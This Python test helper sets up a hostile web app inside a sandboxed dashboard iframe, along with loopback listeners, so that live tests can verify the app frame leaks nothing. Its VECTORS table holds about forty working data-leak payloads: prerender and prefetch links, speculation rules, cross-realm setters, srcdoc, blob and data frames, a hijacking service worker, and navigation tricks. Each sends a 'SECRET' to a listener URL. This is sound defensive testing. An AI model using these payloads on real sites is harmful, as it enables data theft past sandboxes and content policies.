"""A hostile app in the owner's frame, and loopback listeners that count what reaches them.

Used by ``tests/live/test_app_frame_leaks_live.py`` (final fix, lane fx-choice).
Everything is on 127.0.0.1: the app host, a stand-in dashboard page that
frames the app exactly as WebAppFrame does (same sandbox, the dashboard's
CSP), one TCP listener per way out, and UDP listeners for WebRTC. A real
headless Edge or Chrome loads the page with a throwaway profile.

Copyright (c) Cypher Sisters. Apache-2.0 License.
"""
from __future__ import annotations

import http.server
import json
import os
import socket
import socketserver
import subprocess
import threading
import time

APP = "evil-abcdefgh"
HERE = os.path.dirname(os.path.abspath(__file__))
FRAME_SANDBOX = "allow-scripts allow-same-origin allow-forms allow-modals allow-downloads"

#: name -> (where, text). ``{U}`` is the listener's address with page data in
#: it, ``{O}`` the bare listener origin. "head" is markup in the page, "js" a
#: line of the page's own script.
VECTORS: dict[str, tuple[str, str]] = {
    "s_prerender": ("head", '<link rel=prerender href="{U}">'),
    "s_prefetch": ("head", '<link rel=prefetch href="{U}">'),
    "s_preconnect": ("head", '<link rel=preconnect href="{O}">'),
    "s_dnsprefetch": ("head", '<link rel=dns-prefetch href="{O}">'),
    "s_modulepreload": ("head", '<link rel=modulepreload href="{U}">'),
    "s_next": ("head", '<link rel=next href="{U}">'),
    "s_spec": ("head", '<script type=speculationrules>{{"prefetch":[{{"source":"list","urls":["{U}"]}}],'
                       '"prerender":[{{"source":"list","urls":["{U}"]}}]}}</script>'),
    "d_prerender": ("js", "var l=document.createElement('link');l.rel='prerender';l.href='{U}';"
                          "document.head.appendChild(l)"),
    "d_preconnect": ("js", "var l=document.createElement('link');l.rel='preconnect';l.href='{O}';"
                           "document.head.appendChild(l)"),
    "d_relswap": ("js", "var l=document.createElement('link');l.rel='stylesheet';l.href='data:text/css,';"
                        "document.head.appendChild(l);l.setAttribute('rel','prerender');"
                        "l.setAttribute('href','{U}')"),
    "d_relList": ("js", "var l=document.createElement('link');l.href='{U}';l.relList.add('prerender');"
                        "document.head.appendChild(l)"),
    "d_attr": ("js", "var l=document.createElement('link');l.href='{U}';var a=document.createAttribute('rel');"
                     "a.value='prerender';l.setAttributeNode(a);document.head.appendChild(l)"),
    "d_shadow": ("js", "var h=document.createElement('div');document.body.appendChild(h);"
                       "var r=h.attachShadow({{mode:'open'}});var l=document.createElement('link');"
                       "l.rel='prerender';l.href='{U}';r.appendChild(l)"),
    "d_clone": ("js", "var l=document.createElement('link');l.rel='prerender';l.href='{U}';"
                      "document.head.appendChild(l.cloneNode(true))"),
    "d_inner": ("js", "document.body.insertAdjacentHTML('beforeend','<link rel=prerender href=\"{U}\">')"),
    "d_spec": ("js", "var s=document.createElement('script');s.type='speculationrules';"
                     "s.textContent=JSON.stringify({{prefetch:[{{source:'list',urls:['{U}']}}]}});"
                     "document.head.appendChild(s)"),
    "c_blank": ("js", "var f=document.createElement('iframe');document.body.appendChild(f);"
                      "var d=frames[frames.length-1].document;var l=d.createElement('link');l.rel='prerender';"
                      "l.href='{U}';d.head.appendChild(l)"),
    "c_crossrealm": ("js", "var f=document.createElement('iframe');document.body.appendChild(f);"
                           "var W=frames[frames.length-1];var set=Object.getOwnPropertyDescriptor("
                           "W.HTMLLinkElement.prototype,'rel').set;var app=Object.getOwnPropertyDescriptor("
                           "W.Node.prototype,'appendChild').value;var l=document.createElement('link');"
                           "l.href='{U}';set.call(l,'prerender');app.call(document.head,l)"),
    "c_srcdoc_dyn": ("js", "var f=document.createElement('iframe');f.srcdoc='<scr'+'ipt>var l=document."
                           "createElement(\"link\");l.rel=\"prerender\";l.href=\"{U}\";document.head."
                           "appendChild(l)</scr'+'ipt>';document.body.appendChild(f)"),
    "c_srcdoc_pc": ("js", "var f=document.createElement('iframe');f.srcdoc='<link rel=preconnect href=\"{O}\">';"
                          "document.body.appendChild(f)"),
    "c_blob_dyn": ("js", "var S='<scr'+'ipt>var l=document.createElement(\"link\");l.rel=\"prerender\";"
                         "l.href=\"{U}\";document.head.appendChild(l)</scr'+'ipt>';var f=document."
                         "createElement('iframe');f.src=URL.createObjectURL(new Blob([S],{{type:'text/html'}}));"
                         "document.body.appendChild(f)"),
    "c_data_dyn": ("js", "var S='<scr'+'ipt>var l=document.createElement(\"link\");l.rel=\"prerender\";"
                         "l.href=\"{U}\";document.head.appendChild(l)</scr'+'ipt>';var f=document."
                         "createElement('iframe');f.src='data:text/html,'+encodeURIComponent(S);"
                         "document.body.appendChild(f)"),
    "c_jsurl": ("js", "var f=document.createElement('iframe');document.body.appendChild(f);"
                      "var S='<scr'+'ipt>var l=document.createElement(\"link\");l.rel=\"prerender\";"
                      "l.href=\"{U}\";document.head.appendChild(l)</scr'+'ipt>';"
                      "frames[frames.length-1].location.href='javascript:'+JSON.stringify(S)"),
    "self_jsurl": ("js", "setTimeout(function(){{location.href='javascript:'+JSON.stringify("
                         "'<link rel=prerender href=\"{U}\">')}},300)"),
    "sw_fetch": ("sw", ""),
    # moves of the page itself and of frames it makes (fix round 2: each
    # must open no connection at all, not even a bare one)
    "m_selfnav": ("js", "setTimeout(function(){{location.href='{U}'}},300)"),
    "m_assign": ("js", "setTimeout(function(){{location.assign('{U}')}},300)"),
    "m_replace": ("js", "setTimeout(function(){{location.replace('{U}')}},300)"),
    "m_navapi": ("js", "setTimeout(function(){{navigation.navigate('{U}')}},300)"),
    "m_open_self": ("js", "setTimeout(function(){{window.open('{U}','_self')}},300)"),
    "m_meta": ("js", "var m=document.createElement('meta');m.httpEquiv='refresh';"
                     "m.content='0;url={U}';document.head.appendChild(m)"),
    "m_form_self": ("js", "var f=document.createElement('form');f.method='get';f.action='{U}';"
                          "document.body.appendChild(f);setTimeout(function(){{f.submit()}},300)"),
    "m_a_shadow": ("js", "var h=document.createElement('div');document.body.appendChild(h);"
                         "var r=h.attachShadow({{mode:'closed'}});var a=document.createElement('a');"
                         "a.href='{U}';a.textContent='x';r.appendChild(a);setTimeout(function(){{a.click()}},300)"),
    "m_base": ("js", "var b=document.createElement('base');b.href='{O}';document.head.appendChild(b);"
                     "setTimeout(function(){{location.href='x?d=SECRET'}},300)"),
    "f_src": ("js", "var f=document.createElement('iframe');f.src='{U}';document.body.appendChild(f)"),
    "f_setattr": ("js", "var f=document.createElement('iframe');document.body.appendChild(f);"
                        "f.setAttribute('src','{U}')"),
    "f_inner": ("js", "document.body.insertAdjacentHTML('beforeend','<iframe src=\"{U}\"></iframe>')"),
    "f_markup": ("body", '<iframe src="{U}"></iframe>'),
    "f_loc": ("js", "var f=document.createElement('iframe');document.body.appendChild(f);"
                    "setTimeout(function(){{frames[frames.length-1].location.href='{U}'}},300)"),
    "f_open_named": ("js", "var f=document.createElement('iframe');f.name='kid';document.body.appendChild(f);"
                           "setTimeout(function(){{window.open('{U}','kid')}},300)"),
    "f_a_target": ("js", "var f=document.createElement('iframe');f.name='kid';document.body.appendChild(f);"
                         "var a=document.createElement('a');a.href='{U}';a.target='kid';a.textContent='x';"
                         "document.body.appendChild(a);setTimeout(function(){{a.click()}},300)"),
    "f_form_target": ("js", "var f=document.createElement('iframe');f.name='kid';document.body.appendChild(f);"
                            "var g=document.createElement('form');g.method='get';g.action='{U}';g.target='kid';"
                            "document.body.appendChild(g);setTimeout(function(){{g.submit()}},300)"),
    "o_object": ("js", "var o=document.createElement('object');o.data='{U}';document.body.appendChild(o)"),
    "o_embed": ("js", "var o=document.createElement('embed');o.src='{U}';document.body.appendChild(o)"),
}


def _free(kind: int = socket.SOCK_STREAM) -> int:
    s = socket.socket(socket.AF_INET, kind)
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class Listeners:
    def __init__(self, names: list[str], udp: tuple[str, ...] = ()) -> None:
        self.hits: dict[str, list[str]] = {}
        self.ports: dict[str, int] = {}
        self.socks: list[socket.socket] = []
        self.lock = threading.Lock()
        for n in names:
            self._tcp(n)
        for n in udp:
            self._udp(n)

    def note(self, name: str, what: str) -> None:
        with self.lock:
            self.hits.setdefault(name, []).append(what)

    def _tcp(self, name: str) -> None:
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(20)
        self.ports[name] = s.getsockname()[1]
        self.socks.append(s)

        def run() -> None:
            while True:
                try:
                    c, _ = s.accept()
                except OSError:
                    return
                c.settimeout(1.0)
                try:
                    data = c.recv(2048)
                except OSError:
                    data = b""
                self.note(name, data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                          or "(connection, no request)")
                try:
                    c.sendall(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\n\r\n")
                except OSError:
                    pass
                c.close()
        threading.Thread(target=run, daemon=True).start()

    def _udp(self, name: str) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("127.0.0.1", 0))
        self.ports[name] = s.getsockname()[1]
        self.socks.append(s)

        def run() -> None:
            while True:
                try:
                    data, _ = s.recvfrom(4096)
                except OSError:
                    return
                self.note(name, f"{len(data)} bytes")
        threading.Thread(target=run, daemon=True).start()

    def close(self) -> None:
        for s in self.socks:
            try:
                s.close()
            except OSError:
                pass


def vector_page(names: list[str], ports: dict[str, int]) -> tuple[str, dict[str, str]]:
    """The hostile page for ``names`` (and any extra files it needs)."""
    head, body, js, files = [], [], [], {}
    for n in names:
        where, text = VECTORS[n]
        filled = text.replace("{U}", f"http://127.0.0.1:{ports[n]}/x?d=SECRET") \
            .replace("{O}", f"http://127.0.0.1:{ports[n]}/").replace("{{", "{").replace("}}", "}")
        if where == "head":
            head.append(filled)
        elif where == "body":
            body.append(filled)
        elif where == "js":
            js.append("try{" + filled + "}catch(e){}")
        elif where == "sw":
            evil = ("<!doctype html><html><head></head><body><script>fetch('"
                    f"http://127.0.0.1:{ports[n]}/x?d=SECRET" "',{mode:'no-cors'})</script></body></html>")
            files["sw.js"] = ("self.addEventListener('install',function(e){self.skipWaiting()});"
                              "self.addEventListener('activate',function(e){e.waitUntil(clients.claim())});"
                              "self.addEventListener('fetch',function(e){if(e.request.mode==='navigate'){"
                              "e.respondWith(new Response(" + json.dumps(evil) +
                              ",{headers:{'Content-Type':'text/html'}}))}});")
            js.append("try{if(!sessionStorage.getItem('r')){navigator.serviceWorker.register('/sw.js').then("
                      "function(){return navigator.serviceWorker.ready}).then(function(){sessionStorage."
                      "setItem('r','1');setTimeout(function(){location.reload()},300)}).catch(function(){})}"
                      "}catch(e){}")
    page = ("<!doctype html><html><head><meta charset=utf-8><title>Probe</title>" + "".join(head)
            + "</head><body><h1>Probe</h1>" + "".join(body) + "<script>" + ";\n".join(js)
            + "</script></body></html>")
    return page, files


def evil_page(ports: dict[str, int]) -> str:
    """The round 3 acceptance's own hostile page (``hostile_frame_page.html``)."""
    with open(os.path.join(HERE, "hostile_frame_page.html"), encoding="utf-8") as fh:
        page = fh.read()
    page = page.replace("UDP2_PORT", str(ports["stun_from_srcdoc"])).replace("UDP_PORT", str(ports["stun_turn"]))
    for k, v in ports.items():
        page = page.replace("PORT_" + k.upper(), str(v))
    return page


EVIL_TCP = ["preconnect", "prefetch", "ping", "selfnav", "popup", "topnav", "form", "ws", "img", "subframe",
            "beacon", "cssurl", "worker", "fetch", "prerender", "manifest"]
EVIL_UDP = ("stun_turn", "stun_from_srcdoc")


def run(browser: str, page: str, files: dict[str, str], *, seconds: float = 12.0) -> None:
    """Serve ``page`` as the app through the real app host, framed like
    WebAppFrame, load it in ``browser`` headless for ``seconds``. The caller
    has set the scratch state, apps root and ports and holds the listeners."""
    from puffpai import webapps
    from puffpai.webapps import host
    web = webapps.web_dir(APP)
    os.makedirs(web, exist_ok=True)
    with open(os.path.join(web, "index.html"), "w", encoding="utf-8") as fh:
        fh.write(page)
    for rel, body in files.items():
        with open(os.path.join(web, rel), "w", encoding="utf-8") as fh:
            fh.write(body)
    os.makedirs(webapps.app_state_dir(APP), exist_ok=True)
    with open(os.path.join(webapps.app_state_dir(APP), "web.json"), "w", encoding="utf-8") as fh:
        json.dump({"app_id": APP, "status": "installed", "name": "Probe"}, fh)
    host.refresh()
    origin = host.origin_for(APP)
    parent = (f'<!doctype html><html><body><iframe src="{origin}/" sandbox="{FRAME_SANDBOX}" allow="" '
              f'referrerpolicy="no-referrer" width=800 height=600></iframe></body></html>').encode()
    dash_csp = ("default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; "
                "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; "
                f"frame-src 'self' {origin}; frame-ancestors 'none'; "
                "connect-src 'self' blob: http://localhost:* ws://localhost:*; font-src 'self'; "
                "worker-src 'self' blob:;")

    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):  # noqa: D401 - quiet
            return

        def do_GET(self):  # noqa: N802
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Security-Policy", dash_csp)
            self.send_header("X-Frame-Options", "DENY")
            self.send_header("Content-Length", str(len(parent)))
            self.end_headers()
            self.wfile.write(parent)

    dash_port = int(os.environ["PUFFPAI_DASHBOARD_PORT"])
    dash = socketserver.ThreadingTCPServer(("127.0.0.1", dash_port), H)
    threading.Thread(target=dash.serve_forever, daemon=True).start()
    profile = os.path.join(os.environ["PUFFPAI_STATE_DIR"], f"probe-profile-{time.time_ns()}")
    proc = subprocess.Popen([browser, "--headless=new", f"--user-data-dir={profile}", "--no-first-run",
                             "--no-default-browser-check", "--disable-extensions", "--disable-sync",
                             f"http://localhost:{dash_port}/"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(seconds)
    finally:
        tk = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "taskkill.exe")
        subprocess.run([tk, "/T", "/F", "/PID", str(proc.pid)], capture_output=True)
        _stop_profile(profile)
        dash.shutdown()
        dash.server_close()


def _stop_profile(profile: str) -> None:
    """Stop every browser process started with this scratch profile: Edge and
    Chrome hand their window to a new process, which taskkill /T misses."""
    ps = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32",
                      "WindowsPowerShell", "v1.0", "powershell.exe")
    if not os.path.isfile(ps):
        return
    needle = profile.replace("'", "''")
    script = ("Get-CimInstance Win32_Process -Filter \"Name='msedge.exe' or Name='chrome.exe'\" | "
              f"Where-Object {{ $_.CommandLine -like '*{needle}*' }} | "
              "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }")
    subprocess.run([ps, "-NoProfile", "-NonInteractive", "-Command", script], capture_output=True, timeout=60)


__all__ = ["VECTORS", "Listeners", "vector_page", "evil_page", "run", "EVIL_TCP", "EVIL_UDP", "APP", "_free"]
